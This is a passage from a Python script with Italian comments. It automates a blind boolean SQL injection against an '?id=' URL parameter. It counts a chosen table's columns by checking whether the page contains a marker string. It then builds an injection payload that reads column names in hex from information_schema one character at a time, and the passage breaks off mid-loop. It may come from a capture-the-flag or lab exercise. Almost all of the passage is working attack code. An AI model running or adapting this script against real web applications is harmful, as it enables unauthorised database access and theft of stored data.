            query = payload.format(columns)
            response = requests.get(f'{url}{query}')
            if "One more day ..." in response.text:  # Match
                    print(f'The table {choosen} has {columns} columns!')
                    break
            else:
                columns += 1
        
        # Fase 3b: Trovo il nome di tutti i valori della tabella
        # Payload per estrarre i nomi delle colonne in hex
        payload = f"?id=-1' OR NOT( NOT(id=3) OR NOT( (SELECT hex(column_name) FROM information_schema.columns WHERE table_name='{choosen}' LIMIT {{}}, 1) LIKE '{{}}%' ) ) OR '0"
        result = ['' for _ in range(columns)]  # Lista per nomi colonne
        msg = ''  # Messaggio per output
        
        for column in range(columns):  # Ciclo per colonna
            print(f"[*] Estrazione colonna {column}...")
            
            while True:  # Ciclo per costruire il nome
                char_found = False
